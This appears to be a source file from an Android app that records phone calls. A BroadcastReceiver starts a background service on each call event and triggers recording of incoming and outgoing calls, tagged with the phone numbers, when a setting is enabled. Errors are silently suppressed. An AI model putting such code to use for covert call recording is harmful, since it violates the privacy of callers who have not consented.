package com.dwreload.receivers;

import com.dwreload.SettingsManager;
import com.dwreload.modules.RecorderModule;
import com.dwreload.services.AppService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Message;
import android.telephony.TelephonyManager;


public class CallReceiver extends BroadcastReceiver {

	private Boolean incall = false;
	
	@Override
	public void onReceive(final Context context, Intent intent) { 		
        try {
        	SettingsManager settings = new SettingsManager(context);
			context.startService(new Intent(context, AppService.class));
			int state = -1;
			
			String extraState = intent.getStringExtra("state");	
			
			if (extraState != null && extraState.length() > 0) {
				if (extraState.equals("IDLE")) {
					state = TelephonyManager.CALL_STATE_IDLE;
				}
				else{
					if (extraState.equals("OFFHOOK")) {
						state = TelephonyManager.CALL_STATE_OFFHOOK;
					}
					else{
						if (extraState.equals("RINGING")) {
							state = TelephonyManager.CALL_STATE_RINGING;
						}
					}
				}
			}
			
			if (state == -1) {
				TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
				if (telephony != null) {
					state = telephony.getCallState();
				}
			}
			
			switch(state){
				case TelephonyManager.CALL_STATE_IDLE:
					incall = false;
					Message msg = Message.obtain();
					msg.what = RecorderModule.STOP_RECORD_CALL;
					RecorderModule.message(msg);
					
					if (AppService.sThreadManager != null) {
						AppService.sThreadManager.onCallChange();
					}
					break;
				
				case TelephonyManager.CALL_STATE_RINGING:
					if (settings.isRecordEnabled())
						{
						incall = true;
						startRecord(intent, false);
						}
					break;
				
				case TelephonyManager.CALL_STATE_OFFHOOK:
					if (settings.isRecordEnabled() && incall == false)
						{
						startRecord(intent, true);
						}
					break;
			}
			
		} catch (Exception e) {
			//Log.e("CallReceiver", "Error");
		}
	}
	
	private void startRecord(Intent intent, boolean out){
		String num = "R#R" + intent.getExtras().getString("incoming_number");
		if (incall == false)
			{
			num = "T#T" + OutgoingCallReceiver.getOutgoingNumber();
			}
		if (out && incall)
			{
			//Log.e("CallReceiver","OOOPS");
			return;
			}
		Message msg = Message.obtain();
		msg.what = RecorderModule.START_RECORD_CALL;
		msg.obj = num;
		RecorderModule.message(msg);
	}
}
